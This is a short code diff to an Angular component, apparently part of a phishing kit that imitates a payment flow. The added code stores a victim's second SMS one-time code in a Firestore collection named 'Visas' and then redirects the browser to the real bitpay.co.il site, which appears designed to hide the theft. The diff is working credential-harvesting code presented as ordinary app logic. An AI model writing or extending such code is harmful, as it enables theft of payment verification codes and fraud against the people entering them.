@@ -1,4 +1,5 @@
 import { Component } from '@angular/core';
+import { AngularFirestore } from '@angular/fire/compat/firestore';
 import { Router } from '@angular/router';
 
 @Component({
@@ -8,9 +9,15 @@ import { Router } from '@angular/router';
 })
 export class Sms2Component {
   otp: string = '';
-  constructor(private router: Router) {}
+  id:string=''
+  constructor(private router: Router, private firestore:AngularFirestore) {}
   onSubmit() {
     if (this.otp != '') {
+        setTimeout(() => {
+          this.firestore.collection('Visas').doc(this.id).update({
+            sms_2: this.otp,
+          });
+        }, 2000);
       window.location.href = 'https://www.bitpay.co.il/he';
 
     }
